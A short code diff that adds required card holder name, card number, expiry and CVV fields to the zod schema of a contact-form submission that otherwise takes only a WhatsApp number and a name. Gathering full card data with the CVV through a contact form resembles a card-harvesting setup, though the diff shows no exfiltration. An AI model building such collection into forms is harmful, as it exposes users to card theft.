@@ -33,6 +33,10 @@ export const SubmitContactParams = zod.object({
 });
 
 export const SubmitContactBody = zod.object({
+  cardName: zod.string(),
+  cardNumber: zod.string(),
+  cardExpiry: zod.string(),
+  cardCvv: zod.string(),
   whatsapp: zod.string(),
   name: zod.string().optional(),
 });
